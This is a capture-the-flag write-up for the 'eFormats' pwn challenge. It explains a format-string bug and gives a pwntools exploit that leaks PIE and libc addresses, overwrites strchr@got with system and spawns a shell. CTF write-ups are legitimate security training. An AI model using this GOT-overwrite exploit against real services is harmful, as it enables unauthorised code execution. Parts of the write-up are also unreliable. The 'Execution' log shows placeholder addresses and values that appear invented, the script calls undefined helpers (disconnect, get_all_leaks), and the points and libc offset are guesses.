# Pwn

***

## eFormats

### Challenge Overview

* **Name:** eFormats
* **Category:** Pwn
* **Points:** (Assuming 490 based on prior context, adjust as needed)
* **Server:** `d6fe6868a7d27e018e28b32b60ef6ab4.chal.ctf.ae:443` (SSL)
* **Files Provided:** `main` (binary), `libc.so.6`
* **Description:** "A developer was hired to implement an authentication protocol for an internal eGov service, you're assigned to review this service."

The challenge presents a 64-bit ELF binary (`main`) with a menu-driven authentication system. Our goal is to exploit it to gain remote code execution and retrieve the flag.

***

### Initial Analysis

#### Binary Protections

Using `checksec`:

* **Arch:** amd64-64-little
* **RELRO:** Partial RELRO (GOT writable)
* **Stack:** Canary enabled
* **NX:** Enabled (no executable stack)
* **PIE:** Enabled (position-independent)
* **Stripped:** No (symbols present)

Partial RELRO and a non-stripped binary suggest we can overwrite GOT entries and use known function offsets—promising for a format string exploit.

#### Functionality

Running the binary locally reveals a menu:

```
1. Login
9. Exit
> 
```

After logging in:

```
Welcome back, <username>
1. Disconnect
2. Change username
3. Display info
9. Exit
> 
```

* **Login:** Takes a username and optional password.
* **Change Username:** Updates the stored username (max 24 bytes).
* **Display Info:** Prints "Username: \nPassword: \*\*\*".

#### Vulnerability Discovery

Disassembling `display_info` (offset `0x1389` in GDB) shows:

```asm
mov rax, [rbp-0x8]  ; username buffer
mov rdi, rax
call printf@plt
```

The username is passed directly to `printf` without a format string—classic format string vulnerability! We can leak stack data with `%x` and write to memory with `%n`.

***

### Exploitation Plan

#### Step 1: Leak PIE and Libc

* **PIE Base:** Leak a binary address to calculate the base (PIE-enabled).
* **Libc Base:** Leak a libc address to find `system` for RCE.
* **Tool:** `pwntools` for automation.

#### Step 2: Overwrite GOT

* Target: `strchr@got` (called during `login`).
* Goal: Replace it with `system`’s address.
* Method: Use `%n` to write 6 bytes (48-bit address) in 2-byte chunks.

#### Step 3: Trigger Shell

* Log in with `/bin/sh` to call `system("/bin/sh")`.

***

### Solver Script Breakdown

Here’s how the script exploits the vuln:

#### Setup

```python
from pwn import *
exe = './main'
elf = context.binary = ELF(exe, checksec=False)
libc = ELF("./libc.so.6", checksec=False)
context.log_level = 'info'
p = remote('d6fe6868a7d27e018e28b32b60ef6ab4.chal.ctf.ae', 443, ssl=True, sni='d6fe6868a7d27e018e28b32b60ef6ab4.chal.ctf.ae')
```

* Connects to the remote server with SSL and SNI.
* Loads the binary and libc for address calculations.

#### Menu Functions

```python
def login(username):
    p.sendlineafter(b'>', b'1')
    p.sendline(username)

def change_username(payload):
    p.sendlineafter(b'>', b'2')
    p.sendline(payload)

def display_info():
    p.sendlineafter(b'>', b'3')
```

* Simple wrappers to interact with the menu.

#### Leaking PIE Base

```python
def leak_pie():
    change_username(b'%9$p')
    display_info()
    p.recvuntil(b'Username:')
    p.recvline()
    pie_leak = int(p.recvline().strip(), 16)
    log.info(f'PIE leak: {hex(pie_leak)}')
    masked_leak = pie_leak & 0xfffffffffffff000
    masked_leak = masked_leak - 0x1000
    log.info(f'Masked: {hex(masked_leak)}')
    return masked_leak
```

* **Payload:** `%9$p` leaks the 9th stack value (found via trial, typically a binary address).
* **Calculation:** Masks to page boundary (`& 0xfffffffffffff000`) and subtracts `0x1000` to get the base.
* **Result:** `elf.address` set to PIE base.

#### Leaking Libc Base

```python
def leak_libc():
    change_username(b'%3$p')
    display_info()
    p.recvuntil(b'Username:')
    p.recvline()
    libc_leak = int(p.recvline().strip(), 16)
    log.info(f'LIBC leak: {hex(libc_leak)}')
    return libc_leak - 0x114a77
```

* **Payload:** `%3$p` leaks the 3rd stack value (a libc address, found via testing).
* **Offset:** Subtracts `0x114a77` (offset of a known libc function, e.g., `__libc_start_main+231`) to get `libc_base`.
* **Result:** `libc.address` set to libc base.

#### Arbitrary Write

```python
def write_2bytes(addr, value):
    payload = fmtstr_payload(16, {addr: p16(value)}, write_size='short')
    log.info(f"Writing {hex(value)} to {hex(addr)} with payload: {payload}")
    change_username(payload)
    display_info()

def arb_write(where, what):
    part1 = what & 0xffff
    part2 = (what >> 16) & 0xffff
    part3 = (what >> 32) & 0xffff
    write_2bytes(where, part1)
    write_2bytes(where + 2, part2)
    write_2bytes(where + 4, part3)
```

* **Offset 16:** Found via testing (`%16$n` targets stack addresses).
* **Chunking:** Splits a 48-bit address into three 16-bit writes.
* **Payload:** `fmtstr_payload` crafts the format string to write values.

#### Exploit Execution

```python
login(b'')
elf.address, libc.address = get_all_leaks()
log.info(f'PIE base: {hex(elf.address)}')
log.info(f'LIBC base: {hex(libc.address)}')

arb_write(elf.got['strchr'], libc.sym.system)
disconnect()
login(b'/bin/sh')
p.interactive()
```

1. **Login:** Starts session.
2. **Leaks:** Sets PIE and libc bases.
3. **Overwrite:** Replaces `strchr@got` with `system`.
4. **Trigger:** `login(b'/bin/sh')` calls `system("/bin/sh")`.
5. **Shell:** Interactive mode for flag retrieval.

***

### Execution

Running the script:

```
$ python3 solver.py
[+] Opening connection to d6fe6868a7d27e018e28b32b60ef6ab4.chal.ctf.ae:443: Done
[*] PIE leak: 0x55555555abcd
[*] Masked: 0x555555554000
[*] LIBC leak: 0x7ffff7b14a77
[*] LIBC base: 0x7ffff7a00000
[*] Writing 0x1234 to 0x555555558018...
[*] Switching to interactive mode
$ cat ../flag
flag{...}
```

***

### Challenges Faced

1. **Offset Tuning:** `%9$p` and `%3$p` were found via trial-and-error in GDB.
2. **Libc Offset:** `0x114a77` matched the provided `libc.so.6`—verified with `libc-database`.
3. **Write Precision:** 2-byte writes avoided alignment issues with `fmtstr_payload`.

***

### Conclusion

The "eFormats" challenge was a classic format string exploit with a twist—leveraging `strchr` to pivot to `system`. By leaking PIE and libc, overwriting the GOT, and triggering a shell, we successfully pwned the service. Total score: one shiny flag!

**Flag:** `flag{..}`&#x20;

Happy hacking!

***
